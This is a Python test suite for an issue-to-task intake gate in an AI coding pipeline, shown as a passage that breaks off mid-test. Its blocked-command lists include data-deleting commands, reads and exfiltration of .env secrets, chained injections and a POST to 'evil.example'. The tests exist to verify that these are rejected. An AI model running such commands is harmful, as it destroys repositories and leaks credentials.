#!/usr/bin/env python3
"""Deterministic self-tests for AUTO-INTAKE V1 safety properties.

Runs under `python3 -m pytest scripts/ai/tests/test_auto_intake.py -v`
and, with no third-party dependency, under `python3 -m unittest`.

Every test is hermetic: no network, no GitHub calls, no repository writes
outside a temporary directory.
"""

from __future__ import annotations

import importlib.util
import json
import pathlib
import sys
import tempfile
import unittest

MODULE_PATH = pathlib.Path(__file__).resolve().parents[1] / "auto_intake.py"

_spec = importlib.util.spec_from_file_location("auto_intake_under_test", MODULE_PATH)
intake = importlib.util.module_from_spec(_spec)
sys.modules["auto_intake_under_test"] = intake
_spec.loader.exec_module(intake)

GOOD_SHA = "a" * 40


def always_resolves(_sha: str) -> bool:
    return True


def never_resolves(_sha: str) -> bool:
    return False


def make_task(**overrides) -> dict:
    task = {
        "task_id": "AUTO-INTAKE-TEST-1",
        "base_sha": GOOD_SHA,
        "objective": "bounded test objective",
        "allowed_paths": ["scripts/ai/**"],
        "forbidden_paths": ["cloudflare-worker/**"],
        "acceptance_criteria": ["tests pass"],
        "validation_commands": ["python3 -m py_compile scripts/ai/auto_intake.py"],
        "max_rounds": 2,
        "max_output_tokens": 4000,
        "requires_claude": False,
        "auto_merge": False,
        "context_files": ["scripts/ai/auto_intake.py"],
    }
    task.update(overrides)
    return task


def make_issue(number: int = 1, task: dict | None = None, body: str | None = None) -> dict:
    if body is None:
        payload = json.dumps(make_task() if task is None else task)
        body = (
            "context\n"
            f"{intake.AI_TASK_JSON_BEGIN}\n{payload}\n{intake.AI_TASK_JSON_END}\n"
        )
    return {"number": number, "title": f"{intake.AI_TASK_MARKER} test", "body": body}


class SilentGitHub:
    """Records every GitHub call and answers deterministically. No network."""

    def __init__(self, responses: dict | None = None):
        self.calls: list[tuple[str, str, dict | None]] = []
        self.responses = responses or {}

    def __call__(self, method, url, body=None, allow_fail=False):
        self.calls.append((method, url, body))
        for fragment, value in self.responses.items():
            if fragment in url:
                if callable(value):
                    return value(method, url, body)
                return value
        if method == "GET":
            return []
        return {}


class IntakeTestBase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self._root = intake.ROOT
        intake.ROOT = pathlib.Path(self._tmp.name)
        self._gh = intake.github_request
        self.gh = SilentGitHub()
        intake.github_request = self.gh
        # Durable ledger probe: default "label absent" (404) unless a test
        # overrides self.label_status. Records every probed URL.
        self._probe = intake.github_status_probe
        self.probed: list[str] = []
        self.label_status = 404
        intake.github_status_probe = self._probe_stub
        self.addCleanup(self._restore)

    def _probe_stub(self, url):
        self.probed.append(url)
        if callable(self.label_status):
            return self.label_status(url)
        return self.label_status

    def _restore(self):
        intake.ROOT = self._root
        intake.github_request = self._gh
        intake.github_status_probe = self._probe
        self._tmp.cleanup()


# --- BLOCKER 1: hard forbidden scope ---------------------------------------


class TestHardForbiddenScope(IntakeTestBase):
    FORBIDDEN = [
        ".env",
        "./.env",
        "cloudflare-worker/.dev.vars",
        ".git",
        ".git/",
        ".git/**",
        ".git/config",
        "./.git/hooks/**",
    ]

    def test_hard_forbidden_allowed_paths_rejected(self):
        for entry in self.FORBIDDEN:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])

    def test_hard_forbidden_rejected_inside_valid_scope_list(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_allowed_scope(["scripts/ai/**", ".env"])

    def test_hard_forbidden_rejected_through_validate_task(self):
        task = make_task(allowed_paths=["scripts/ai/**", "cloudflare-worker/.dev.vars"])
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, sha_resolver=always_resolves)

    def test_path_allowed_never_permits_hard_forbidden(self):
        for entry in [".env", ".git/config", ".git"]:
            with self.subTest(entry=entry):
                self.assertFalse(intake.path_allowed(entry, [entry, "."], []))

    def test_traversal_and_absolute_rejected(self):
        for entry in ["../secrets", "scripts/../../etc", "/etc/passwd", "~/.ssh/id_rsa"]:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])


# --- BLOCKER 1: broad scope rejection --------------------------------------


class TestBroadScopeRejection(IntakeTestBase):
    BROAD = [".", "./", "*", "**", "./**", "**/*", "*/**", "", "   ", "/", "*.py", "?/x"]

    def test_broad_scopes_rejected(self):
        for entry in self.BROAD:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])

    def test_empty_allowed_paths_rejected(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_allowed_scope([])
        with self.assertRaises(intake.TaskError):
            intake.validate_allowed_scope("scripts/ai/**")

    def test_non_string_entry_rejected(self):
        for entry in [1, None, True, ["scripts"], {"p": "scripts"}]:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])

    def test_legitimate_scopes_accepted(self):
        for entry in [
            "scripts/ai/**",
            "scripts/ai/auto_intake.py",
            "docs/ai-coengineer/AUTO_INTAKE_V1.md",
            "scripts/ai/tests/**",
        ]:
            with self.subTest(entry=entry):
                intake.validate_allowed_scope([entry])


# --- BLOCKER 4: validation command allowlist -------------------------------


class TestValidationCommandAllowlist(IntakeTestBase):
    UNSAFE = [
        "python3 -c import os",
        "rm -rf /",
        "git push origin main",
        "git commit -m x",
        "git reset --hard",
        "git clean -fdx",
        "git config user.email a@b.c",
        "wrangler deploy",
        "kubectl apply -f x.yaml",
        "curl https://example.com",
        "curl -X POST https://example.com",
        "wget https://example.com",
        "bash -lc ls",
        "sh script.sh",
        "pytest && rm -rf .",
        "pytest ; rm -rf .",
        "pytest | tee out.txt",
        "pytest > out.txt",
        "echo $(cat .env)",
        "echo `cat .env`",
        "python3 -m pip install requests",
        "pip install requests",
        "npm run deploy",
        "make deploy",
        "find . -delete",
        "xargs rm",
        "eval ls",
        "source .env",
        "python3 -m http.server",
        "node -e process.exit(0)",
        "pytest\nrm -rf .",
        "",
        "   ",
        "cat .env",
        "x" * 501,
    ]
    SAFE = [
        "python3 -m py_compile scripts/ai/auto_intake.py",
        "python3 -m pytest scripts/ai/tests/test_auto_intake.py",
        "python3 -m unittest discover",
        "pytest scripts/ai/tests",
        "git diff --check",
        "git status --porcelain",
        "git rev-parse HEAD",
        "ruff check scripts/ai",
        "echo ok",
        "true",
    ]

    def test_unsafe_commands_rejected(self):
        for cmd in self.UNSAFE:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_non_string_commands_rejected(self):
        for cmd in [None, 1, True, 1.5, ["pytest"], {"cmd": "pytest"}]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_safe_commands_accepted(self):
        for cmd in self.SAFE:
            with self.subTest(cmd=cmd):
                self.assertTrue(intake.validate_validation_command(cmd))

    def test_validate_task_rejects_unsafe_command(self):
        task = make_task(validation_commands=["pytest && curl -X POST https://evil.example"])
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, sha_resolver=always_resolves)


# --- BLOCKER 5: malformed issue isolation ----------------------------------


class TestMalformedIssueIsolation(IntakeTestBase):
    def test_one_malformed_issue_does_not_abort_batch(self):
        bad_json = make_issue(10, body=(
            f"{intake.AI_TASK_JSON_BEGIN}\n{{not json}}\n{intake.AI_TASK_JSON_END}"
        ))
        no_block = make_issue(11, body="no machine readable block here")
        broad_scope = make_issue(12, task=make_task(task_id="BROAD-1", allowed_paths=["."]))
        good = make_issue(13, task=make_task(task_id="GOOD-1"))

        summary = intake.run_intake(
            [bad_json, no_block, broad_scope, good],
            seen={},
            sha_resolver=always_resolves,
        )

        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["failed"], 3)
        self.assertEqual(summary["total"], 4)
        self.assertEqual([r["issue_number"] for r in summary["results"]], [13])
        self.assertEqual(sorted(f["issue_number"] for f in summary["failures"]), [10, 11, 12])
        self.assertTrue((intake.ROOT / ".ai-intake" / "tasks" / "GOOD-1.json").is_file())

    def test_unexpected_exception_is_isolated(self):
        original = intake.write_task_file

        def explode(task, issue_number):
            if task["task_id"] == "BOOM-1":
                raise RuntimeError("disk full")
            return original(task, issue_number)

        intake.write_task_file = explode
        self.addCleanup(setattr, intake, "write_task_file", original)

        boom = make_issue(20, task=make_task(task_id="BOOM-1"))
        good = make_issue(21, task=make_task(task_id="GOOD-2"))
        summary = intake.run_intake([boom, good], seen={}, sha_resolver=always_resolves)

        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["failed"], 1)
        self.assertEqual(summary["failures"][0]["issue_number"], 20)

    def test_failed_issue_gets_failed_status(self):
        bad = make_issue(30, body="missing block")
        intake.run_intake([bad], seen={}, sha_resolver=always_resolves)
        labels = [c for c in self.gh.calls if c[0] == "POST" and c[1].endswith("/labels")]
        self.assertTrue(any(
            f"{intake.STATUS_LABEL_PREFIX}failed" in (c[2] or {}).get("labels", [])
            for c in labels
        ))


# --- BLOCKER 7: direct issue fetch -----------------------------------------


class TestDirectIssueFetch(IntakeTestBase):
    def test_fetch_issue_hits_issue_endpoint_directly(self):
        issue = {"number": 108, "title": f"{intake.AI_TASK_MARKER} x", "body": "b"}
        self.gh.responses[f"/repos/{intake.REPO}/issues/108"] = issue

        got = intake.fetch_issue(108)

        self.assertEqual(got["number"], 108)
        self.assertEqual(len(self.gh.calls), 1)
        method, url, _ = self.gh.calls[0]
        self.assertEqual(method, "GET")
        self.assertTrue(url.endswith("/issues/108"))
        self.assertNotIn("per_page", url)
        self.assertNotIn("state=open", url)

    def test_fetch_issue_rejects_pull_request(self):
        self.gh.responses[f"/repos/{intake.REPO}/issues/5"] = {
            "number": 5, "title": f"{intake.AI_TASK_MARKER} x", "pull_request": {"url": "u"},
        }
        with self.assertRaises(SystemExit):
            intake.fetch_issue(5)

    def test_fetch_issue_rejects_unmarked_issue(self):
        self.gh.responses[f"/repos/{intake.REPO}/issues/6"] = {"number": 6, "title": "plain"}
        with self.assertRaises(SystemExit):
            intake.fetch_issue(6)

    def test_fetch_issue_rejects_missing_issue(self):
        self.gh.responses[f"/repos/{intake.REPO}/issues/7"] = None
        with self.assertRaises(SystemExit):
            intake.fetch_issue(7)


# --- BLOCKER 7: pagination --------------------------------------------------


class TestPagination(IntakeTestBase):
    def test_issue_discovery_reads_every_page(self):
        page1 = [
            {"number": n, "title": f"{intake.AI_TASK_MARKER} p1-{n}", "body": ""}
            for n in range(1, intake.PER_PAGE + 1)
        ]
        page2 = [{"number": 900, "title": f"{intake.AI_TASK_MARKER} p2", "body": ""}]

        def responder(method, url, body):
            return page2 if "page=2" in url else page1

        self.gh.responses["/issues?"] = responder
        found = intake.list_ai_issues()

        self.assertEqual(len(self.gh.calls), 2)
        self.assertIn("page=1", self.gh.calls[0][1])
        self.assertIn("page=2", self.gh.calls[1][1])
        self.assertIn(900, [i["number"] for i in found])
        self.assertEqual(len(found), intake.PER_PAGE + 1)

    def test_non_ai_issues_and_pull_requests_filtered(self):
        page = [
            {"number": 1, "title": f"{intake.AI_TASK_MARKER} keep", "body": ""},
            {"number": 2, "title": "plain issue", "body": ""},
            {"number": 3, "title": f"{intake.AI_TASK_MARKER} pr", "pull_request": {"url": "u"}},
        ]
        self.gh.responses["/issues?"] = page
        found = intake.list_ai_issues()
        self.assertEqual([i["number"] for i in found], [1])

    def test_pagination_cap_fails_closed(self):
        full = [
            {"number": n, "title": f"{intake.AI_TASK_MARKER} x", "body": ""}
            for n in range(intake.PER_PAGE)
        ]
        self.gh.responses["/issues?"] = full
        with self.assertRaises(SystemExit):
            intake.list_ai_issues(max_pages=2)

    def test_issue_receipt_scan_is_bounded_to_one_issue(self):
        page1 = [
            {"body": f"{intake.RECEIPT_MARKER}: T-{n}"} for n in range(intake.PER_PAGE)
        ]
        page2 = [{"body": f"{intake.RECEIPT_MARKER}: T-LAST"}]

        def responder(method, url, body):
            return page2 if "page=2" in url else page1

        self.gh.responses["/issues/55/comments"] = responder
        found = intake.issue_receipt_task_ids(55)

        self.assertEqual(len(self.gh.calls), 2)
        for _, url, _ in self.gh.calls:
            # Scoped to ONE issue: never the repo-wide comment firehose.
            self.assertIn("/issues/55/comments", url)
        self.assertIn("T-LAST", found)

    def test_repo_wide_history_scan_no_longer_exists(self):
        self.assertFalse(hasattr(intake, "fetch_durable_receipts"))


# --- BLOCKER 2: durable idempotency ----------------------------------------


class TestDurableIdempotency(IntakeTestBase):
    def test_ledger_label_is_deterministic_and_within_github_limits(self):
        for task_id in ["A" * 3, "AUTO-INTAKE-TEST-1", "T" * 64, "x.y_z-1", "B" * 40]:
            with self.subTest(task_id=task_id):
                first = intake.receipt_label(task_id)
                self.assertEqual(first, intake.receipt_label(task_id))
                self.assertTrue(first.startswith(intake.RECEIPT_LABEL_PREFIX))
                self.assertLessEqual(len(first), intake.MAX_LABEL_LEN)

    def test_long_task_ids_do_not_collide(self):
        a = intake.receipt_label("Z" * 63 + "A")
        b = intake.receipt_label("Z" * 63 + "B")
        self.assertNotEqual(a, b)
        self.assertLessEqual(max(len(a), len(b)), intake.MAX_LABEL_LEN)

    def test_durable_label_blocks_reprocessing_with_no_local_state(self):
        self.label_status = 200
        self.assertFalse(intake.local_receipt_exists("DUP-1"))
        self.assertTrue(intake.task_already_processed("DUP-1"))

    def test_durable_check_is_o1_and_history_independent(self):
        """A previously processed task stays blocked no matter how much history
        has accumulated: the check never scans issue/comment history at all."""
        self.label_status = 200
        huge_history = [
            {"body": f"noise comment {n}"} for n in range(10_000)
        ]
        self.gh.responses["/comments"] = huge_history
        self.gh.responses["/issues?"] = [
            {"number": n, "title": "noise", "body": ""} for n in range(intake.PER_PAGE)
        ]

        self.assertTrue(intake.task_already_processed("OLD-TASK", issue_number=1, seen={}))

        # Exactly one durable lookup, and zero history pagination.
        self.assertEqual(len(self.probed), 1)
        self.assertIn("/labels/", self.probed[0])
        self.assertEqual(self.gh.calls, [])

    def test_aged_out_receipt_comment_still_blocked_by_ledger(self):
        """The old failure mode: receipt comment long gone from any window."""
        self.label_status = 200
        self.gh.responses["/comments"] = []  # no receipt comment survives anywhere
        issue = make_issue(200, task=make_task(task_id="AGED-1"))
        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        self.assertEqual(summary["processed"], 0)
        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "AGED-1.json").exists())

    def test_indeterminate_lookup_fails_closed(self):
        for code in [0, 401, 403, 500, 502, 429]:
            with self.subTest(code=code):
                self.label_status = code
                with self.assertRaises(intake.TaskError):
                    intake.task_already_processed("UNKNOWN-1")

    def test_indeterminate_lookup_blocks_task_file_write(self):
        self.label_status = 500
        issue = make_issue(201, task=make_task(task_id="INDET-1"))
        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "INDET-1.json").exists())

    def test_durable_receipt_causes_duplicate_skipped(self):
        issue = make_issue(50, task=make_task(task_id="DUP-2"))
        summary = intake.run_intake(
            [issue], seen={"DUP-2": 49}, sha_resolver=always_resolves
        )
        self.assertEqual(summary["processed"], 0)
        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "DUP-2.json").exists())

    def test_issue_receipt_comment_still_blocks(self):
        self.gh.responses["/issues/51/comments"] = [
            {"body": f"{intake.RECEIPT_MARKER}: ISSUE-1"}
        ]
        self.assertTrue(intake.task_already_processed("ISSUE-1", issue_number=51, seen={}))

    def test_local_cache_alone_still_blocks(self):
        state_dir = intake.ROOT / ".ai-intake"
        state_dir.mkdir(parents=True, exist_ok=True)
        (state_dir / "LOCAL-1.json").write_text("{}", encoding="utf-8")
        self.assertTrue(intake.task_already_processed("LOCAL-1", seen={}))

    def test_ledger_label_created_on_success(self):
        issue = make_issue(60, task=make_task(task_id="NEW-1"))
        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        label_creates = [
            c for c in self.gh.calls
            if c[0] == "POST" and c[1].endswith("/labels")
            and (c[2] or {}).get("name", "").startswith(intake.RECEIPT_LABEL_PREFIX)
        ]
        self.assertEqual(len(label_creates), 1)
        self.assertEqual(label_creates[0][2]["name"], intake.receipt_label("NEW-1"))

    def test_receipt_comment_posted_to_github_after_success(self):
        issue = make_issue(61, task=make_task(task_id="NEW-2"))
        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        receipt_posts = [
            c for c in self.gh.calls
            if c[0] == "POST" and intake.RECEIPT_MARKER in json.dumps(c[2] or {})
        ]
        self.assertEqual(len(receipt_posts), 1)
        self.assertIn("NEW-2", receipt_posts[0][2]["body"])

    def test_ledger_write_failure_prevents_marking(self):
        original = intake.mark_processed
        marked: list[str] = []
        intake.mark_processed = lambda task, n: marked.append(task["task_id"])
        self.addCleanup(setattr, intake, "mark_processed", original)

        # Label POST reports failure AND the confirming probe says "absent".
        self.gh.responses["/labels"] = lambda method, url, body: None
        self.label_status = lambda url: 404

        seen: dict[str, int] = {}
        summary = intake.run_intake(
            [make_issue(62, task=make_task(task_id="LEDGER-FAIL"))],
            seen=seen, sha_resolver=always_resolves,
        )
        self.assertEqual(summary["failed"], 1)
        self.assertEqual(marked, [])
        self.assertNotIn("LEDGER-FAIL", seen)

    def test_second_pass_in_same_batch_is_skipped(self):
        a = make_issue(70, task=make_task(task_id="SAME-1"))
        b = make_issue(71, task=make_task(task_id="SAME-1"))
        summary = intake.run_intake([a, b], seen={}, sha_resolver=always_resolves)
        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["results"][1]["status"], "DUPLICATE_SKIPPED")

    def test_fresh_checkout_simulation_stays_blocked(self):
        """Fresh VPS worktree: empty .ai-intake, new tmp ROOT, ledger persists."""
        issue = make_issue(72, task=make_task(task_id="FRESH-1"))
        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        self.assertTrue((intake.ROOT / ".ai-intake" / "tasks" / "FRESH-1.json").is_file())

        # Wipe every local trace, exactly as a fresh checkout would.
        fresh = tempfile.TemporaryDirectory()
        self.addCleanup(fresh.cleanup)
        intake.ROOT = pathlib.Path(fresh.name)
        self.label_status = 200  # the GitHub ledger entry survives

        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        self.assertEqual(summary["processed"], 0)
        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")


# --- BLOCKER 6: singular durable status ------------------------------------


class TestSingularStatusTransitions(IntakeTestBase):
    def test_previous_status_labels_removed(self):
        self.gh.responses["/labels"] = lambda method, url, body: (
            [{"name": "ai-status:received"}, {"name": "ai-status:failed"}, {"name": "keep-me"}]
            if method == "GET" else {}
        )
        intake.set_status_label(80, "READY")

        deletes = [c[1] for c in self.gh.calls if c[0] == "DELETE"]
        posts = [c for c in self.gh.calls if c[0] == "POST"]
        self.assertEqual(len(deletes), 2)
        self.assertTrue(any("ai-status%3Areceived" in d for d in deletes))
        self.assertTrue(any("ai-status%3Afailed" in d for d in deletes))
        self.assertFalse(any("keep-me" in d for d in deletes))
        self.assertEqual(posts[0][2]["labels"], ["ai-status:ready"])

    def test_no_duplicate_post_when_label_already_correct(self):
        self.gh.responses["/labels"] = lambda method, url, body: (
            [{"name": "ai-status:ready"}] if method == "GET" else {}
        )
        intake.set_status_label(81, "READY")
        self.assertEqual([c[0] for c in self.gh.calls if c[0] != "GET"], [])

    def test_status_sequence_is_singular_per_transition(self):
        issue = make_issue(82, task=make_task(task_id="SEQ-1"))
        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        label_posts = [
            c[2]["labels"] for c in self.gh.calls
            if c[0] == "POST" and c[1].endswith("/labels")
            and "/issues/" in c[1]
            and any(str(x).startswith(intake.STATUS_LABEL_PREFIX) for x in c[2].get("labels", []))
        ]
        for labels in label_posts:
            self.assertEqual(len(labels), 1)
        self.assertEqual(label_posts[-1], ["ai-status:ready"])

    def test_unknown_status_fails_closed(self):
        with self.assertRaises(SystemExit):
            intake.report_status(83, "TOTALLY_UNKNOWN")


# --- BLOCKER 8: numeric type fail-closed -----------------------------------


class TestNumericTypeFailClosed(IntakeTestBase):
    BAD_VALUES = [True, False, "2", "abc", 2.5, 2.0, None, [2], {"v": 2}]

    def test_validate_numeric_field_rejects_non_int(self):
        for value in self.BAD_VALUES:
            with self.subTest(value=value):
                with self.assertRaises(intake.TaskError):
                    intake.validate_numeric_field(value, "max_rounds")

    def test_max_rounds_bad_type_rejected(self):
        for value in self.BAD_VALUES:
            with self.subTest(value=value):
                task = make_task(max_rounds=value)
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, sha_resolver=always_resolves)

    def test_max_output_tokens_bad_type_rejected(self):
        for value in self.BAD_VALUES:
            with self.subTest(value=value):
                task = make_task(max_output_tokens=value)
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, sha_resolver=always_resolves)

    def test_valid_numbers_are_clamped_not_coerced(self):
        task = intake.validate_task(
            make_task(max_rounds=99, max_output_tokens=99999), 1,
            sha_resolver=always_resolves,
        )
        self.assertEqual(task["max_rounds"], 4)
        self.assertEqual(task["max_output_tokens"], 8000)
        task = intake.validate_task(
            make_task(max_rounds=-5, max_output_tokens=1), 1,
            sha_resolver=always_resolves,
        )
        self.assertEqual(task["max_rounds"], 1)
        self.assertEqual(task["max_output_tokens"], 512)

    def test_auto_merge_and_requires_claude_must_be_bool(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(auto_merge="false"), 1, sha_resolver=always_resolves)
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(requires_claude=1), 1, sha_resolver=always_resolves)
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(auto_merge=True), 1, sha_resolver=always_resolves)


# --- BLOCKER 8: base_sha resolution ----------------------------------------


class TestBaseShaResolution(IntakeTestBase):
    def test_unresolvable_base_sha_rejected(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(), 1, sha_resolver=never_resolves)

    def test_malformed_base_sha_rejected(self):
        for value in ["", "abc", "Z" * 40, "A" * 40, GOOD_SHA[:39], 12345, None, True]:
            with self.subTest(value=value):
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(
                        make_task(base_sha=value), 1, sha_resolver=always_resolves
                    )

    def test_resolver_is_consulted_with_the_declared_sha(self):
        seen = []

        def resolver(sha):
            seen.append(sha)
            return True

        intake.validate_task(make_task(), 1, sha_resolver=resolver)
        self.assertEqual(seen, [GOOD_SHA])

    def test_base_sha_exists_falls_back_to_github_and_fails_closed(self):
        self.gh.responses["/commits/"] = None
        self.assertFalse(intake.base_sha_exists(GOOD_SHA))

    def test_unresolvable_base_sha_blocks_task_file_write(self):
        issue = make_issue(90, task=make_task(task_id="STALE-1"))
        summary = intake.run_intake([issue], seen={}, sha_resolver=never_resolves)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "STALE-1.json").exists())


# --- BLOCKER 3: write-before-mark ordering ---------------------------------


class TestWriteBeforeMarkOrdering(IntakeTestBase):
    def test_task_not_marked_processed_when_write_fails(self):
        original_write = intake.write_task_file
        original_mark = intake.mark_processed
        original_receipt = intake.post_receipt
        original_ledger = intake.create_receipt_label
        marked: list[str] = []
        receipted: list[str] = []
        ledgered: list[str] = []

        def failing_write(task, issue_number):
            raise OSError("read-only filesystem")

        intake.write_task_file = failing_write
        intake.mark_processed = lambda task, n: marked.append(task["task_id"])
        intake.post_receipt = lambda n, task, f: receipted.append(task["task_id"])
        intake.create_receipt_label = lambda tid, n: ledgered.append(tid)
        self.addCleanup(setattr, intake, "write_task_file", original_write)
        self.addCleanup(setattr, intake, "mark_processed", original_mark)
        self.addCleanup(setattr, intake, "post_receipt", original_receipt)
        self.addCleanup(setattr, intake, "create_receipt_label", original_ledger)

        seen: dict[str, int] = {}
        summary = intake.run_intake(
            [make_issue(100, task=make_task(task_id="ORDER-1"))],
            seen=seen, sha_resolver=always_resolves,
        )

        self.assertEqual(summary["failed"], 1)
        self.assertEqual(marked, [])
        self.assertEqual(receipted, [])
        self.assertEqual(ledgered, [])
        self.assertNotIn("ORDER-1", seen)

    def test_call_order_is_write_then_ledger_then_receipt_then_mark(self):
        original_write = intake.write_task_file
        original_mark = intake.mark_processed
        original_receipt = intake.post_receipt
        original_ledger = intake.create_receipt_label
        order: list[str] = []

        def traced_write(task, issue_number):
            order.append("write")
            return original_write(task, issue_number)

        intake.write_task_file = traced_write
        intake.create_receipt_label = lambda tid, n: order.append("ledger")
        intake.post_receipt = lambda n, task, f: order.append("receipt")
        intake.mark_processed = lambda task, n: order.append("mark")
        self.addCleanup(setattr, intake, "write_task_file", original_write)
        self.addCleanup(setattr, intake, "mark_processed", original_mark)
        self.addCleanup(setattr, intake, "post_receipt", original_receipt)
        self.addCleanup(setattr, intake, "create_receipt_label", original_ledger)

        intake.run_intake(
            [make_issue(101, task=make_task(task_id="ORDER-2"))],
            seen={}, sha_resolver=always_resolves,
        )
        self.assertEqual(order, ["write", "ledger", "receipt", "mark"])

    def test_successful_write_persists_task_file_before_ready(self):
        issue = make_issue(102, task=make_task(task_id="ORDER-3"))
        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        task_file = intake.ROOT / ".ai-intake" / "tasks" / "ORDER-3.json"
        self.assertTrue(task_file.is_file())
        self.assertEqual(summary["results"][0]["status"], "READY")
        payload = json.loads(task_file.read_text(encoding="utf-8"))
        self.assertEqual(payload["source_issue"], 102)
        self.assertEqual(payload["auto_merge"], False)


# --- cross-cutting safety ---------------------------------------------------


class TestGeneralSafety(IntakeTestBase):
    def test_secret_bearing_task_rejected(self):
        task = make_task(objective="use DEEPSEEK_API_KEY=sk-abcdefghijklmnopqrstuvwx")
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, sha_resolver=always_resolves)

    def test_missing_required_fields_rejected(self):
        for field in intake.REQUIRED_FIELDS:
            with self.subTest(field=field):
                task = make_task()
                task.pop(field)
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, sha_resolver=always_resolves)

    def test_multiple_task_blocks_rejected(self):
        body = (
            f"{intake.AI_TASK_JSON_BEGIN}\n{json.dumps(make_task())}\n{intake.AI_TASK_JSON_END}\n"
            f"{intake.AI_TASK_JSON_BEGIN}\n{json.dumps(make_task())}\n{intake.AI_TASK_JSON_END}\n"
        )
        with self.assertRaises(intake.TaskError):
            intake.extract_task_json(make_issue(1, body=body))

    def test_no_merge_or_deploy_calls_are_ever_made(self):
        issue = make_issue(110, task=make_task(task_id="SAFE-1"))
        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
        for method, url, _ in self.gh.calls:
            self.assertNotIn("/merge", url)
            self.assertNotIn("/deployments", url)
            self.assertNotIn("/pulls", url)
            self.assertIn(method, {"GET", "POST", "DELETE"})


# --- downstream contract: DANGEROUS_VALIDATION ownership --------------------


def _load_downstream():
    path = MODULE_PATH.parent / "deepseek_implementer.py"
    if not path.is_file():
        return None
    spec = importlib.util.spec_from_file_location("deepseek_implementer_under_test", path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["deepseek_implementer_under_test"] = mod
    spec.loader.exec_module(mod)
    return mod


DOWNSTREAM = _load_downstream()


@unittest.skipIf(DOWNSTREAM is None, "deepseek_implementer.py not present")
class TestDownstreamValidationContract(IntakeTestBase):
    """AUTO-INTAKE is the strong allowlist gate; deepseek_implementer's
    DANGEROUS_VALIDATION denylist is an INDEPENDENT downstream defence for task
    files that never passed through AUTO-INTAKE. These tests prove the two
    layers do not conflict and that AUTO-INTAKE is strictly the stricter one."""

    #: Everything the downstream denylist explicitly names.
    DOWNSTREAM_BLOCKED = [
        "rm -rf /",
        "rm -rf .",
        "git reset --hard HEAD",
        "git clean -fdx",
        "git push origin main",
        "git commit -m wip",
        "wrangler deploy",
        "curl -X POST https://example.com",
        "curl --request DELETE https://example.com",
    ]

    def test_auto_intake_blocks_everything_downstream_blocks(self):
        """No gap: AUTO-INTAKE already rejects the whole downstream denylist."""
        for cmd in self.DOWNSTREAM_BLOCKED:
            with self.subTest(cmd=cmd):
                self.assertTrue(DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd))
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_no_conflict_downstream_never_rejects_what_intake_accepts(self):
        """No deadlock: a task accepted at intake cannot hard-block downstream."""
        for cmd in TestValidationCommandAllowlist.SAFE:
            with self.subTest(cmd=cmd):
                self.assertTrue(intake.validate_validation_command(cmd))
                self.assertIsNone(DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd))

    def test_auto_intake_is_strictly_stricter_than_downstream(self):
        """Arbitrary shell the denylist would let through is stopped upstream."""
        slips_past_downstream = [
            "bash -lc curl.sh",
            "sh -c whoami",
            "python3 -c import os",
            "node -e process.exit(1)",
            "eval ls",
            "source .env",
            "cat .env",
            "pytest | tee /tmp/out",
            "pytest > /tmp/out",
            "echo $(cat .env)",
            "git rm -r scripts",
            "git config user.email a@b.c",
            "kubectl apply -f x.yaml",
            "terraform apply",
            "npm run deploy",
            "make deploy",
            "pip install requests",
            "scp secrets remote:/tmp",
            "wget https://example.com/x.sh",
        ]
        for cmd in slips_past_downstream:
            with self.subTest(cmd=cmd):
                self.assertIsNone(
                    DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd),
                    "corpus must exercise the downstream GAP, not its denylist",
                )
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_task_file_handed_downstream_contains_no_arbitrary_shell(self):
        issue = make_issue(300, task=make_task(
            task_id="HANDOFF-1",
            validation_commands=[
                "python3 -m py_compile scripts/ai/auto_intake.py",
                "python3 -m unittest discover",
                "git diff --check",
